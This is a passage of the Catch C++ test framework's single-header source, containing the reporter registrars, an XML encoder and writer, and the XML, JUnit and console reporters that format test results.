		virtual void testGroupEnded(TestGroupStats const& testGroupStats) CATCH_OVERRIDE {
			Ptr<TestGroupNode> node = new TestGroupNode(testGroupStats);
			node->children.swap(m_testCases);
			m_testGroups.push_back(node);
		}
		virtual void testRunEnded(TestRunStats const& testRunStats) CATCH_OVERRIDE {
			Ptr<TestRunNode> node = new TestRunNode(testRunStats);
			node->children.swap(m_testGroups);
			m_testRuns.push_back(node);
			testRunEndedCumulative();
		}
		virtual void testRunEndedCumulative() = 0;

		virtual void skipTest(TestCaseInfo const&) CATCH_OVERRIDE {}

		Ptr<IConfig const> m_config;
		std::ostream& stream;
		std::vector<AssertionStats> m_assertions;
		std::vector<std::vector<Ptr<SectionNode> > > m_sections;
		std::vector<Ptr<TestCaseNode> > m_testCases;
		std::vector<Ptr<TestGroupNode> > m_testGroups;

		std::vector<Ptr<TestRunNode> > m_testRuns;

		Ptr<SectionNode> m_rootSection;
		Ptr<SectionNode> m_deepestSection;
		std::vector<Ptr<SectionNode> > m_sectionStack;
		ReporterPreferences m_reporterPrefs;

	};

	template<char C>
	char const* getLineOfChars() {
		static char line[CATCH_CONFIG_CONSOLE_WIDTH] = { 0 };
		if (!*line) {
			memset(line, C, CATCH_CONFIG_CONSOLE_WIDTH - 1);
			line[CATCH_CONFIG_CONSOLE_WIDTH - 1] = 0;
		}
		return line;
	}

	struct TestEventListenerBase : StreamingReporterBase {
		TestEventListenerBase(ReporterConfig const& _config)
			: StreamingReporterBase(_config)
		{}

		virtual void assertionStarting(AssertionInfo const&) CATCH_OVERRIDE {}
		virtual bool assertionEnded(AssertionStats const&) CATCH_OVERRIDE {
			return false;
		}
	};

} // end namespace Catch

  // #included from: ../internal/catch_reporter_registrars.hpp
#define TWOBLUECUBES_CATCH_REPORTER_REGISTRARS_HPP_INCLUDED

namespace Catch {

	template<typename T>
	class LegacyReporterRegistrar {

		class ReporterFactory : public IReporterFactory {
			virtual IStreamingReporter* create(ReporterConfig const& config) const {
				return new LegacyReporterAdapter(new T(config));
			}

			virtual std::string getDescription() const {
				return T::getDescription();
			}
		};

	public:

		LegacyReporterRegistrar(std::string const& name) {
			getMutableRegistryHub().registerReporter(name, new ReporterFactory());
		}
	};

	template<typename T>
	class ReporterRegistrar {

		class ReporterFactory : public SharedImpl<IReporterFactory> {

			// *** Please Note ***:
			// - If you end up here looking at a compiler error because it's trying to register
			// your custom reporter class be aware that the native reporter interface has changed
			// to IStreamingReporter. The "legacy" interface, IReporter, is still supported via
			// an adapter. Just use REGISTER_LEGACY_REPORTER to take advantage of the adapter.
			// However please consider updating to the new interface as the old one is now
			// deprecated and will probably be removed quite soon!
			// Please contact me via github if you have any questions at all about this.
			// In fact, ideally, please contact me anyway to let me know you've hit this - as I have
			// no idea who is actually using custom reporters at all (possibly no-one!).
			// The new interface is designed to minimise exposure to interface changes in the future.
			virtual IStreamingReporter* create(ReporterConfig const& config) const {
				return new T(config);
			}

			virtual std::string getDescription() const {
				return T::getDescription();
			}
		};

	public:

		ReporterRegistrar(std::string const& name) {
			getMutableRegistryHub().registerReporter(name, new ReporterFactory());
		}
	};

	template<typename T>
	class ListenerRegistrar {

		class ListenerFactory : public SharedImpl<IReporterFactory> {

			virtual IStreamingReporter* create(ReporterConfig const& config) const {
				return new T(config);
			}
			virtual std::string getDescription() const {
				return "";
			}
		};

	public:

		ListenerRegistrar() {
			getMutableRegistryHub().registerListener(new ListenerFactory());
		}
	};
}

#define INTERNAL_CATCH_REGISTER_LEGACY_REPORTER( name, reporterType ) \
    namespace{ Catch::LegacyReporterRegistrar<reporterType> catch_internal_RegistrarFor##reporterType( name ); }

#define INTERNAL_CATCH_REGISTER_REPORTER( name, reporterType ) \
    namespace{ Catch::ReporterRegistrar<reporterType> catch_internal_RegistrarFor##reporterType( name ); }

#define INTERNAL_CATCH_REGISTER_LISTENER( listenerType ) \
    namespace{ Catch::ListenerRegistrar<listenerType> catch_internal_RegistrarFor##listenerType; }

// #included from: ../internal/catch_xmlwriter.hpp
#define TWOBLUECUBES_CATCH_XMLWRITER_HPP_INCLUDED

#include <sstream>
#include <string>
#include <vector>
#include <iomanip>

namespace Catch {

	class XmlEncode {
	public:
		enum ForWhat { ForTextNodes, ForAttributes };

		XmlEncode(std::string const& str, ForWhat forWhat = ForTextNodes)
			: m_str(str),
			m_forWhat(forWhat)
		{}

		void encodeTo(std::ostream& os) const {

			// Apostrophe escaping not necessary if we always use " to write attributes
			// (see: http://www.w3.org/TR/xml/#syntax)

			for (std::size_t i = 0; i < m_str.size(); ++i) {
				char c = m_str[i];
				switch (c) {
				case '<':   os << "&lt;"; break;
				case '&':   os << "&amp;"; break;

				case '>':
					// See: http://www.w3.org/TR/xml/#syntax
					if (i > 2 && m_str[i - 1] == ']' && m_str[i - 2] == ']')
						os << "&gt;";
					else
						os << c;
					break;

				case '\"':
					if (m_forWhat == ForAttributes)
						os << "&quot;";
					else
						os << c;
					break;

				default:
					// Escape control chars - based on contribution by @espenalb in PR #465
					if ((c < '\x09') || (c > '\x0D' && c < '\x20') || c == '\x7F')
						os << "&#x" << std::uppercase << std::hex << static_cast<int>(c);
					else
						os << c;
				}
			}
		}

		friend std::ostream& operator << (std::ostream& os, XmlEncode const& xmlEncode) {
			xmlEncode.encodeTo(os);
			return os;
		}

	private:
		std::string m_str;
		ForWhat m_forWhat;
	};

	class XmlWriter {
	public:

		class ScopedElement {
		public:
			ScopedElement(XmlWriter* writer)
				: m_writer(writer)
			{}

			ScopedElement(ScopedElement const& other)
				: m_writer(other.m_writer) {
				other.m_writer = CATCH_NULL;
			}

			~ScopedElement() {
				if (m_writer)
					m_writer->endElement();
			}

			ScopedElement& writeText(std::string const& text, bool indent = true) {
				m_writer->writeText(text, indent);
				return *this;
			}

			template<typename T>
			ScopedElement& writeAttribute(std::string const& name, T const& attribute) {
				m_writer->writeAttribute(name, attribute);
				return *this;
			}

		private:
			mutable XmlWriter* m_writer;
		};

		XmlWriter()
			: m_tagIsOpen(false),
			m_needsNewline(false),
			m_os(&Catch::cout())
		{}

		XmlWriter(std::ostream& os)
			: m_tagIsOpen(false),
			m_needsNewline(false),
			m_os(&os)
		{}

		~XmlWriter() {
			while (!m_tags.empty())
				endElement();
		}

		XmlWriter& startElement(std::string const& name) {
			ensureTagClosed();
			newlineIfNecessary();
			stream() << m_indent << "<" << name;
			m_tags.push_back(name);
			m_indent += "  ";
			m_tagIsOpen = true;
			return *this;
		}

		ScopedElement scopedElement(std::string const& name) {
			ScopedElement scoped(this);
			startElement(name);
			return scoped;
		}

		XmlWriter& endElement() {
			newlineIfNecessary();
			m_indent = m_indent.substr(0, m_indent.size() - 2);
			if (m_tagIsOpen) {
				stream() << "/>\n";
				m_tagIsOpen = false;
			}
			else {
				stream() << m_indent << "</" << m_tags.back() << ">\n";
			}
			m_tags.pop_back();
			return *this;
		}

		XmlWriter& writeAttribute(std::string const& name, std::string const& attribute) {
			if (!name.empty() && !attribute.empty())
				stream() << " " << name << "=\"" << XmlEncode(attribute, XmlEncode::ForAttributes) << "\"";
			return *this;
		}

		XmlWriter& writeAttribute(std::string const& name, bool attribute) {
			stream() << " " << name << "=\"" << (attribute ? "true" : "false") << "\"";
			return *this;
		}

		template<typename T>
		XmlWriter& writeAttribute(std::string const& name, T const& attribute) {
			std::ostringstream oss;
			oss << attribute;
			return writeAttribute(name, oss.str());
		}

		XmlWriter& writeText(std::string const& text, bool indent = true) {
			if (!text.empty()) {
				bool tagWasOpen = m_tagIsOpen;
				ensureTagClosed();
				if (tagWasOpen && indent)
					stream() << m_indent;
				stream() << XmlEncode(text);
				m_needsNewline = true;
			}
			return *this;
		}

		XmlWriter& writeComment(std::string const& text) {
			ensureTagClosed();
			stream() << m_indent << "<!--" << text << "-->";
			m_needsNewline = true;
			return *this;
		}

		XmlWriter& writeBlankLine() {
			ensureTagClosed();
			stream() << "\n";
			return *this;
		}

		void setStream(std::ostream& os) {
			m_os = &os;
		}

	private:
		XmlWriter(XmlWriter const&);
		void operator=(XmlWriter const&);

		std::ostream& stream() {
			return *m_os;
		}

		void ensureTagClosed() {
			if (m_tagIsOpen) {
				stream() << ">\n";
				m_tagIsOpen = false;
			}
		}

		void newlineIfNecessary() {
			if (m_needsNewline) {
				stream() << "\n";
				m_needsNewline = false;
			}
		}

		bool m_tagIsOpen;
		bool m_needsNewline;
		std::vector<std::string> m_tags;
		std::string m_indent;
		std::ostream* m_os;
	};

}
// #included from: catch_reenable_warnings.h

#define TWOBLUECUBES_CATCH_REENABLE_WARNINGS_H_INCLUDED

#ifdef __clang__
#    ifdef __ICC // icpc defines the __clang__ macro
#        pragma warning(pop)
#    else
#        pragma clang diagnostic pop
#    endif
#elif defined __GNUC__
#    pragma GCC diagnostic pop
#endif


namespace Catch {
	class XmlReporter : public StreamingReporterBase {
	public:
		XmlReporter(ReporterConfig const& _config)
			: StreamingReporterBase(_config),
			m_sectionDepth(0)
		{
			m_reporterPrefs.shouldRedirectStdOut = true;
		}

		virtual ~XmlReporter() CATCH_OVERRIDE;

		static std::string getDescription() {
			return "Reports test results as an XML document";
		}

	public: // StreamingReporterBase

		virtual void noMatchingTestCases(std::string const& s) CATCH_OVERRIDE {
			StreamingReporterBase::noMatchingTestCases(s);
		}

		virtual void testRunStarting(TestRunInfo const& testInfo) CATCH_OVERRIDE {
			StreamingReporterBase::testRunStarting(testInfo);
			m_xml.setStream(stream);
			m_xml.startElement("Catch");
			if (!m_config->name().empty())
				m_xml.writeAttribute("name", m_config->name());
		}

		virtual void testGroupStarting(GroupInfo const& groupInfo) CATCH_OVERRIDE {
			StreamingReporterBase::testGroupStarting(groupInfo);
			m_xml.startElement("Group")
				.writeAttribute("name", groupInfo.name);
		}

		virtual void testCaseStarting(TestCaseInfo const& testInfo) CATCH_OVERRIDE {
			StreamingReporterBase::testCaseStarting(testInfo);
			m_xml.startElement("TestCase").writeAttribute("name", trim(testInfo.name));

			if (m_config->showDurations() == ShowDurations::Always)
				m_testCaseTimer.start();
		}

		virtual void sectionStarting(SectionInfo const& sectionInfo) CATCH_OVERRIDE {
			StreamingReporterBase::sectionStarting(sectionInfo);
			if (m_sectionDepth++ > 0) {
				m_xml.startElement("Section")
					.writeAttribute("name", trim(sectionInfo.name))
					.writeAttribute("description", sectionInfo.description);
			}
		}

		virtual void assertionStarting(AssertionInfo const&) CATCH_OVERRIDE { }

		virtual bool assertionEnded(AssertionStats const& assertionStats) CATCH_OVERRIDE {
			const AssertionResult& assertionResult = assertionStats.assertionResult;

			// Print any info messages in <Info> tags.
			if (assertionStats.assertionResult.getResultType() != ResultWas::Ok) {
				for (std::vector<MessageInfo>::const_iterator it = assertionStats.infoMessages.begin(), itEnd = assertionStats.infoMessages.end();
					it != itEnd;
					++it) {
					if (it->type == ResultWas::Info) {
						m_xml.scopedElement("Info")
							.writeText(it->message);
					}
					else if (it->type == ResultWas::Warning) {
						m_xml.scopedElement("Warning")
							.writeText(it->message);
					}
				}
			}

			// Drop out if result was successful but we're not printing them.
			if (!m_config->includeSuccessfulResults() && isOk(assertionResult.getResultType()))
				return true;

			// Print the expression if there is one.
			if (assertionResult.hasExpression()) {
				m_xml.startElement("Expression")
					.writeAttribute("success", assertionResult.succeeded())
					.writeAttribute("type", assertionResult.getTestMacroName())
					.writeAttribute("filename", assertionResult.getSourceInfo().file)
					.writeAttribute("line", assertionResult.getSourceInfo().line);

				m_xml.scopedElement("Original")
					.writeText(assertionResult.getExpression());
				m_xml.scopedElement("Expanded")
					.writeText(assertionResult.getExpandedExpression());
			}

			// And... Print a result applicable to each result type.
			switch (assertionResult.getResultType()) {
			case ResultWas::ThrewException:
				m_xml.scopedElement("Exception")
					.writeAttribute("filename", assertionResult.getSourceInfo().file)
					.writeAttribute("line", assertionResult.getSourceInfo().line)
					.writeText(assertionResult.getMessage());
				break;
			case ResultWas::FatalErrorCondition:
				m_xml.scopedElement("Fatal Error Condition")
					.writeAttribute("filename", assertionResult.getSourceInfo().file)
					.writeAttribute("line", assertionResult.getSourceInfo().line)
					.writeText(assertionResult.getMessage());
				break;
			case ResultWas::Info:
				m_xml.scopedElement("Info")
					.writeText(assertionResult.getMessage());
				break;
			case ResultWas::Warning:
				// Warning will already have been written
				break;
			case ResultWas::ExplicitFailure:
				m_xml.scopedElement("Failure")
					.writeText(assertionResult.getMessage());
				break;
			default:
				break;
			}

			if (assertionResult.hasExpression())
				m_xml.endElement();

			return true;
		}

		virtual void sectionEnded(SectionStats const& sectionStats) CATCH_OVERRIDE {
			StreamingReporterBase::sectionEnded(sectionStats);
			if (--m_sectionDepth > 0) {
				XmlWriter::ScopedElement e = m_xml.scopedElement("OverallResults");
				e.writeAttribute("successes", sectionStats.assertions.passed);
				e.writeAttribute("failures", sectionStats.assertions.failed);
				e.writeAttribute("expectedFailures", sectionStats.assertions.failedButOk);

				if (m_config->showDurations() == ShowDurations::Always)
					e.writeAttribute("durationInSeconds", sectionStats.durationInSeconds);

				m_xml.endElement();
			}
		}

		virtual void testCaseEnded(TestCaseStats const& testCaseStats) CATCH_OVERRIDE {
			StreamingReporterBase::testCaseEnded(testCaseStats);
			XmlWriter::ScopedElement e = m_xml.scopedElement("OverallResult");
			e.writeAttribute("success", testCaseStats.totals.assertions.allOk());

			if (m_config->showDurations() == ShowDurations::Always)
				e.writeAttribute("durationInSeconds", m_testCaseTimer.getElapsedSeconds());

			m_xml.endElement();
		}

		virtual void testGroupEnded(TestGroupStats const& testGroupStats) CATCH_OVERRIDE {
			StreamingReporterBase::testGroupEnded(testGroupStats);
			// TODO: Check testGroupStats.aborting and act accordingly.
			m_xml.scopedElement("OverallResults")
				.writeAttribute("successes", testGroupStats.totals.assertions.passed)
				.writeAttribute("failures", testGroupStats.totals.assertions.failed)
				.writeAttribute("expectedFailures", testGroupStats.totals.assertions.failedButOk);
			m_xml.endElement();
		}

		virtual void testRunEnded(TestRunStats const& testRunStats) CATCH_OVERRIDE {
			StreamingReporterBase::testRunEnded(testRunStats);
			m_xml.scopedElement("OverallResults")
				.writeAttribute("successes", testRunStats.totals.assertions.passed)
				.writeAttribute("failures", testRunStats.totals.assertions.failed)
				.writeAttribute("expectedFailures", testRunStats.totals.assertions.failedButOk);
			m_xml.endElement();
		}

	private:
		Timer m_testCaseTimer;
		XmlWriter m_xml;
		int m_sectionDepth;
	};

	INTERNAL_CATCH_REGISTER_REPORTER("xml", XmlReporter)

} // end namespace Catch

  // #included from: ../reporters/catch_reporter_junit.hpp
#define TWOBLUECUBES_CATCH_REPORTER_JUNIT_HPP_INCLUDED

#include <assert.h>

namespace Catch {

	class JunitReporter : public CumulativeReporterBase {
	public:
		JunitReporter(ReporterConfig const& _config)
			: CumulativeReporterBase(_config),
			xml(_config.stream())
		{
			m_reporterPrefs.shouldRedirectStdOut = true;
		}

		virtual ~JunitReporter() CATCH_OVERRIDE;

		static std::string getDescription() {
			return "Reports test results in an XML format that looks like Ant's junitreport target";
		}

		virtual void noMatchingTestCases(std::string const& /*spec*/) CATCH_OVERRIDE {}

		virtual void testRunStarting(TestRunInfo const& runInfo) CATCH_OVERRIDE {
			CumulativeReporterBase::testRunStarting(runInfo);
			xml.startElement("testsuites");
		}

		virtual void testGroupStarting(GroupInfo const& groupInfo) CATCH_OVERRIDE {
			suiteTimer.start();
			stdOutForSuite.str("");
			stdErrForSuite.str("");
			unexpectedExceptions = 0;
			CumulativeReporterBase::testGroupStarting(groupInfo);
		}

		virtual bool assertionEnded(AssertionStats const& assertionStats) CATCH_OVERRIDE {
			if (assertionStats.assertionResult.getResultType() == ResultWas::ThrewException)
				unexpectedExceptions++;
			return CumulativeReporterBase::assertionEnded(assertionStats);
		}

		virtual void testCaseEnded(TestCaseStats const& testCaseStats) CATCH_OVERRIDE {
			stdOutForSuite << testCaseStats.stdOut;
			stdErrForSuite << testCaseStats.stdErr;
			CumulativeReporterBase::testCaseEnded(testCaseStats);
		}

		virtual void testGroupEnded(TestGroupStats const& testGroupStats) CATCH_OVERRIDE {
			double suiteTime = suiteTimer.getElapsedSeconds();
			CumulativeReporterBase::testGroupEnded(testGroupStats);
			writeGroup(*m_testGroups.back(), suiteTime);
		}

		virtual void testRunEndedCumulative() CATCH_OVERRIDE {
			xml.endElement();
		}

		void writeGroup(TestGroupNode const& groupNode, double suiteTime) {
			XmlWriter::ScopedElement e = xml.scopedElement("testsuite");
			TestGroupStats const& stats = groupNode.value;
			xml.writeAttribute("name", stats.groupInfo.name);
			xml.writeAttribute("errors", unexpectedExceptions);
			xml.writeAttribute("failures", stats.totals.assertions.failed - unexpectedExceptions);
			xml.writeAttribute("tests", stats.totals.assertions.total());
			xml.writeAttribute("hostname", "tbd"); // !TBD
			if (m_config->showDurations() == ShowDurations::Never)
				xml.writeAttribute("time", "");
			else
				xml.writeAttribute("time", suiteTime);
			xml.writeAttribute("timestamp", "tbd"); // !TBD

													// Write test cases
			for (TestGroupNode::ChildNodes::const_iterator
				it = groupNode.children.begin(), itEnd = groupNode.children.end();
				it != itEnd;
				++it)
				writeTestCase(**it);

			xml.scopedElement("system-out").writeText(trim(stdOutForSuite.str()), false);
			xml.scopedElement("system-err").writeText(trim(stdErrForSuite.str()), false);
		}

		void writeTestCase(TestCaseNode const& testCaseNode) {
			TestCaseStats const& stats = testCaseNode.value;

			// All test cases have exactly one section - which represents the
			// test case itself. That section may have 0-n nested sections
			assert(testCaseNode.children.size() == 1);
			SectionNode const& rootSection = *testCaseNode.children.front();

			std::string className = stats.testInfo.className;

			if (className.empty()) {
				if (rootSection.childSections.empty())
					className = "global";
			}
			writeSection(className, "", rootSection);
		}

		void writeSection(std::string const& className,
			std::string const& rootName,
			SectionNode const& sectionNode) {
			std::string name = trim(sectionNode.stats.sectionInfo.name);
			if (!rootName.empty())
				name = rootName + "/" + name;

			if (!sectionNode.assertions.empty() ||
				!sectionNode.stdOut.empty() ||
				!sectionNode.stdErr.empty()) {
				XmlWriter::ScopedElement e = xml.scopedElement("testcase");
				if (className.empty()) {
					xml.writeAttribute("classname", name);
					xml.writeAttribute("name", "root");
				}
				else {
					xml.writeAttribute("classname", className);
					xml.writeAttribute("name", name);
				}
				xml.writeAttribute("time", Catch::toString(sectionNode.stats.durationInSeconds));

				writeAssertions(sectionNode);

				if (!sectionNode.stdOut.empty())
					xml.scopedElement("system-out").writeText(trim(sectionNode.stdOut), false);
				if (!sectionNode.stdErr.empty())
					xml.scopedElement("system-err").writeText(trim(sectionNode.stdErr), false);
			}
			for (SectionNode::ChildSections::const_iterator
				it = sectionNode.childSections.begin(),
				itEnd = sectionNode.childSections.end();
				it != itEnd;
				++it)
				if (className.empty())
					writeSection(name, "", **it);
				else
					writeSection(className, name, **it);
		}

		void writeAssertions(SectionNode const& sectionNode) {
			for (SectionNode::Assertions::const_iterator
				it = sectionNode.assertions.begin(), itEnd = sectionNode.assertions.end();
				it != itEnd;
				++it)
				writeAssertion(*it);
		}
		void writeAssertion(AssertionStats const& stats) {
			AssertionResult const& result = stats.assertionResult;
			if (!result.isOk()) {
				std::string elementName;
				switch (result.getResultType()) {
				case ResultWas::ThrewException:
				case ResultWas::FatalErrorCondition:
					elementName = "error";
					break;
				case ResultWas::ExplicitFailure:
					elementName = "failure";
					break;
				case ResultWas::ExpressionFailed:
					elementName = "failure";
					break;
				case ResultWas::DidntThrowException:
					elementName = "failure";
					break;

					// We should never see these here:
				case ResultWas::Info:
				case ResultWas::Warning:
				case ResultWas::Ok:
				case ResultWas::Unknown:
				case ResultWas::FailureBit:
				case ResultWas::Exception:
					elementName = "internalError";
					break;
				}

				XmlWriter::ScopedElement e = xml.scopedElement(elementName);

				xml.writeAttribute("message", result.getExpandedExpression());
				xml.writeAttribute("type", result.getTestMacroName());

				std::ostringstream oss;
				if (!result.getMessage().empty())
					oss << result.getMessage() << "\n";
				for (std::vector<MessageInfo>::const_iterator
					it = stats.infoMessages.begin(),
					itEnd = stats.infoMessages.end();
					it != itEnd;
					++it)
					if (it->type == ResultWas::Info)
						oss << it->message << "\n";

				oss << "at " << result.getSourceInfo();
				xml.writeText(oss.str(), false);
			}
		}

		XmlWriter xml;
		Timer suiteTimer;
		std::ostringstream stdOutForSuite;
		std::ostringstream stdErrForSuite;
		unsigned int unexpectedExceptions;
	};

	INTERNAL_CATCH_REGISTER_REPORTER("junit", JunitReporter)

} // end namespace Catch

  // #included from: ../reporters/catch_reporter_console.hpp
#define TWOBLUECUBES_CATCH_REPORTER_CONSOLE_HPP_INCLUDED

namespace Catch {

	struct ConsoleReporter : StreamingReporterBase {
		ConsoleReporter(ReporterConfig const& _config)
			: StreamingReporterBase(_config),
			m_headerPrinted(false)
		{}

		virtual ~ConsoleReporter() CATCH_OVERRIDE;
		static std::string getDescription() {
			return "Reports test results as plain lines of text";
		}

		virtual void noMatchingTestCases(std::string const& spec) CATCH_OVERRIDE {
			stream << "No test cases matched '" << spec << "'" << std::endl;
		}

		virtual void assertionStarting(AssertionInfo const&) CATCH_OVERRIDE {
		}

		virtual bool assertionEnded(AssertionStats const& _assertionStats) CATCH_OVERRIDE {
			AssertionResult const& result = _assertionStats.assertionResult;

			bool printInfoMessages = true;

			// Drop out if result was successful and we're not printing those
			if (!m_config->includeSuccessfulResults() && result.isOk()) {
				if (result.getResultType() != ResultWas::Warning)
					return false;
				printInfoMessages = false;
			}

			lazyPrint();

			AssertionPrinter printer(stream, _assertionStats, printInfoMessages);
			printer.print();
			stream << std::endl;
			return true;
		}

		virtual void sectionStarting(SectionInfo const& _sectionInfo) CATCH_OVERRIDE {
			m_headerPrinted = false;
			StreamingReporterBase::sectionStarting(_sectionInfo);
		}
		virtual void sectionEnded(SectionStats const& _sectionStats) CATCH_OVERRIDE {
			if (_sectionStats.missingAssertions) {
				lazyPrint();
				Colour colour(Colour::ResultError);
				if (m_sectionStack.size() > 1)
					stream << "\nNo assertions in section";
				else
					stream << "\nNo assertions in test case";
				stream << " '" << _sectionStats.sectionInfo.name << "'\n" << std::endl;
			}
			if (m_headerPrinted) {
				if (m_config->showDurations() == ShowDurations::Always)
					stream << "Completed in " << _sectionStats.durationInSeconds << "s" << std::endl;
				m_headerPrinted = false;
			}
			else {
				if (m_config->showDurations() == ShowDurations::Always)
					stream << _sectionStats.sectionInfo.name << " completed in " << _sectionStats.durationInSeconds << "s" << std::endl;
			}
			StreamingReporterBase::sectionEnded(_sectionStats);
		}

		virtual void testCaseEnded(TestCaseStats const& _testCaseStats) CATCH_OVERRIDE {
			StreamingReporterBase::testCaseEnded(_testCaseStats);
			m_headerPrinted = false;
		}
		virtual void testGroupEnded(TestGroupStats const& _testGroupStats) CATCH_OVERRIDE {
			if (currentGroupInfo.used) {
				printSummaryDivider();
				stream << "Summary for group '" << _testGroupStats.groupInfo.name << "':\n";
				printTotals(_testGroupStats.totals);
				stream << "\n" << std::endl;
			}
			StreamingReporterBase::testGroupEnded(_testGroupStats);
		}
		virtual void testRunEnded(TestRunStats const& _testRunStats) CATCH_OVERRIDE {
			printTotalsDivider(_testRunStats.totals);
			printTotals(_testRunStats.totals);
			stream << std::endl;
			StreamingReporterBase::testRunEnded(_testRunStats);
		}

	private:

		class AssertionPrinter {
			void operator= (AssertionPrinter const&);
		public:
			AssertionPrinter(std::ostream& _stream, AssertionStats const& _stats, bool _printInfoMessages)
				: stream(_stream),
				stats(_stats),
				result(_stats.assertionResult),
				colour(Colour::None),
				message(result.getMessage()),
				messages(_stats.infoMessages),
				printInfoMessages(_printInfoMessages)
			{
				switch (result.getResultType()) {
				case ResultWas::Ok:
					colour = Colour::Success;
					passOrFail = "PASSED";
					//if( result.hasMessage() )
					if (_stats.infoMessages.size() == 1)
						messageLabel = "with message";
					if (_stats.infoMessages.size() > 1)
						messageLabel = "with messages";
					break;
				case ResultWas::ExpressionFailed:
					if (result.isOk()) {
						colour = Colour::Success;
						passOrFail = "FAILED - but was ok";
					}
					else {
						colour = Colour::Error;
						passOrFail = "FAILED";
					}
					if (_stats.infoMessages.size() == 1)
						messageLabel = "with message";
					if (_stats.infoMessages.size() > 1)
						messageLabel = "with messages";
					break;
				case ResultWas::ThrewException:
					colour = Colour::Error;
					passOrFail = "FAILED";
					messageLabel = "due to unexpected exception with message";
					break;
				case ResultWas::FatalErrorCondition:
					colour = Colour::Error;
					passOrFail = "FAILED";
					messageLabel = "due to a fatal error condition";
					break;
				case ResultWas::DidntThrowException:
					colour = Colour::Error;
					passOrFail = "FAILED";
					messageLabel = "because no exception was thrown where one was expected";
					break;
				case ResultWas::Info:
					messageLabel = "info";
					break;
				case ResultWas::Warning:
					messageLabel = "warning";
					break;
				case ResultWas::ExplicitFailure:
					passOrFail = "FAILED";
					colour = Colour::Error;
					if (_stats.infoMessages.size() == 1)
						messageLabel = "explicitly with message";
					if (_stats.infoMessages.size() > 1)
						messageLabel = "explicitly with messages";
					break;
					// These cases are here to prevent compiler warnings
				case ResultWas::Unknown:
				case ResultWas::FailureBit:
				case ResultWas::Exception:
					passOrFail = "** internal error **";
					colour = Colour::Error;
					break;
				}
			}

			void print() const {
				printSourceInfo();
				if (stats.totals.assertions.total() > 0) {
					if (result.isOk())
						stream << "\n";
					printResultType();
					printOriginalExpression();
					printReconstructedExpression();
				}
				else {
					stream << "\n";
				}
				printMessage();
			}

		private:
			void printResultType() const {
				if (!passOrFail.empty()) {
					Colour colourGuard(colour);
					stream << passOrFail << ":\n";
				}
			}
			void printOriginalExpression() const {
				if (result.hasExpression()) {
					Colour colourGuard(Colour::OriginalExpression);
					stream << "  ";
					stream << result.getExpressionInMacro();
					stream << "\n";
				}
			}
			void printReconstructedExpression() const {
				if (result.hasExpandedExpression()) {
					stream << "with expansion:\n";
					Colour colourGuard(Colour::ReconstructedExpression);
					stream << Text(result.getExpandedExpression(), TextAttributes().setIndent(2)) << "\n";
				}
			}
			void printMessage() const {
				if (!messageLabel.empty())
					stream << messageLabel << ":" << "\n";
				for (std::vector<MessageInfo>::const_iterator it = messages.begin(), itEnd = messages.end();
					it != itEnd;
					++it) {
					// If this assertion is a warning ignore any INFO messages
					if (printInfoMessages || it->type != ResultWas::Info)
						stream << Text(it->message, TextAttributes().setIndent(2)) << "\n";
				}
			}
			void printSourceInfo() const {
				Colour colourGuard(Colour::FileName);
				stream << result.getSourceInfo() << ": ";
			}

			std::ostream& stream;
			AssertionStats const& stats;
			AssertionResult const& result;
			Colour::Code colour;
			std::string passOrFail;
			std::string messageLabel;
			std::string message;
			std::vector<MessageInfo> messages;
			bool printInfoMessages;
		};

		void lazyPrint() {

			if (!currentTestRunInfo.used)
				lazyPrintRunInfo();
			if (!currentGroupInfo.used)
				lazyPrintGroupInfo();

			if (!m_headerPrinted) {
				printTestCaseAndSectionHeader();
				m_headerPrinted = true;
			}
		}
		void lazyPrintRunInfo() {
			stream << "\n" << getLineOfChars<'~'>() << "\n";
			Colour colour(Colour::SecondaryText);
			stream << currentTestRunInfo->name
				<< " is a Catch v" << libraryVersion << " host application.\n"
				<< "Run with -? for options\n\n";

			if (m_config->rngSeed() != 0)
				stream << "Randomness seeded to: " << m_config->rngSeed() << "\n\n";

			currentTestRunInfo.used = true;
		}
		void lazyPrintGroupInfo() {
			if (!currentGroupInfo->name.empty() && currentGroupInfo->groupsCounts > 1) {
				printClosedHeader("Group: " + currentGroupInfo->name);
				currentGroupInfo.used = true;
			}
		}
		void printTestCaseAndSectionHeader() {
			assert(!m_sectionStack.empty());
			printOpenHeader(currentTestCaseInfo->name);

			if (m_sectionStack.size() > 1) {
				Colour colourGuard(Colour::Headers);

				std::vector<SectionInfo>::const_iterator
					it = m_sectionStack.begin() + 1, // Skip first section (test case)
					itEnd = m_sectionStack.end();
				for (; it != itEnd; ++it)
					printHeaderString(it->name, 2);
			}

			SourceLineInfo lineInfo = m_sectionStack.front().lineInfo;

			if (!lineInfo.empty()) {
				stream << getLineOfChars<'-'>() << "\n";
				Colour colourGuard(Colour::FileName);
				stream << lineInfo << "\n";
			}
			stream << getLineOfChars<'.'>() << "\n" << std::endl;
		}

		void printClosedHeader(std::string const& _name) {
			printOpenHeader(_name);
			stream << getLineOfChars<'.'>() << "\n";
		}
		void printOpenHeader(std::string const& _name) {
			stream << getLineOfChars<'-'>() << "\n";
			{
				Colour colourGuard(Colour::Headers);
				printHeaderString(_name);
			}
		}

		// if string has a : in first line will set indent to follow it on
		// subsequent lines
		void printHeaderString(std::string const& _string, std::size_t indent = 0) {
			std::size_t i = _string.find(": ");
			if (i != std::string::npos)
				i += 2;
			else
				i = 0;
			stream << Text(_string, TextAttributes()
				.setIndent(indent + i)
				.setInitialIndent(indent)) << "\n";
		}

		struct SummaryColumn {

			SummaryColumn(std::string const& _label, Colour::Code _colour)
				: label(_label),
				colour(_colour)
			{}
			SummaryColumn addRow(std::size_t count) {
				std::ostringstream oss;
				oss << count;
				std::string row = oss.str();
				for (std::vector<std::string>::iterator it = rows.begin(); it != rows.end(); ++it) {
					while (it->size() < row.size())
						*it = " " + *it;
					while (it->size() > row.size())
						row = " " + row;
				}
				rows.push_back(row);
				return *this;
			}

			std::string label;
			Colour::Code colour;
			std::vector<std::string> rows;

		};

		void printTotals(Totals const& totals) {
			if (totals.testCases.total() == 0) {
				stream << Colour(Colour::Warning) << "No tests ran\n";
			}
			else if (totals.assertions.total() > 0 && totals.testCases.allPassed()) {
				stream << Colour(Colour::ResultSuccess) << "All tests passed";
				stream << " ("
					<< pluralise(totals.assertions.passed, "assertion") << " in "
					<< pluralise(totals.testCases.passed, "test case") << ")"
					<< "\n";
			}
			else {

				std::vector<SummaryColumn> columns;
				columns.push_back(SummaryColumn("", Colour::None)
					.addRow(totals.testCases.total())
					.addRow(totals.assertions.total()));
				columns.push_back(SummaryColumn("passed", Colour::Success)
					.addRow(totals.testCases.passed)
					.addRow(totals.assertions.passed));
